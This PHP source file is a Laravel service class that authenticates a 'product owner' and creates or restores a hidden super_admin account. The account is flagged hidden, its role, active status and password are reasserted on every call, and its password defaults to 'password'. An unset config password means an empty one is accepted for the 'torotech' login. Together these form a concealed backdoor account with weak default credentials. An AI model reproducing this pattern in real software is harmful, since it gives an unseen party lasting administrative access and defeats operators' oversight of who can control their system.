<?php

namespace App\Services;

use App\Models\Role;
use App\Models\User;
use Illuminate\Support\Facades\Hash;

class ProductOwnerAuth
{
    public static function credentialsMatch(string $username, string $password): bool
    {
        $expectedUser = strtolower(trim(config('product_owner.username', 'torotech')));
        $givenUser = strtolower(trim($username));

        if ($givenUser !== $expectedUser) {
            return false;
        }

        return hash_equals((string) config('product_owner.password', ''), $password);
    }

    public static function resolveOrCreateUser(): User
    {
        $username = trim((string) config('product_owner.username', 'torotech'));
        $roleId = Role::query()->where('role_name', 'super_admin')->value('id');

        $user = User::query()->where('username', $username)->first();

        if (! $user) {
            $user = User::create([
                'name' => (string) config('product_owner.display_name', 'ToroTech Product Owner'),
                'username' => $username,
                'password' => Hash::make((string) config('product_owner.password', 'password')),
                'role_id' => $roleId,
                'status' => User::STATUS_ACTIVE,
                'is_product_owner' => true,
                'is_hidden' => true,
            ]);

            return $user->load('role');
        }

        $updates = [
            'is_product_owner' => true,
            'is_hidden' => true,
            'status' => User::STATUS_ACTIVE,
        ];

        if ($roleId && (int) $user->role_id !== (int) $roleId) {
            $updates['role_id'] = $roleId;
        }

        if (! Hash::check((string) config('product_owner.password', 'password'), $user->password)) {
            $updates['password'] = Hash::make((string) config('product_owner.password', 'password'));
        }

        if ($updates !== []) {
            $user->update($updates);
        }

        return $user->fresh(['role']);
    }
}
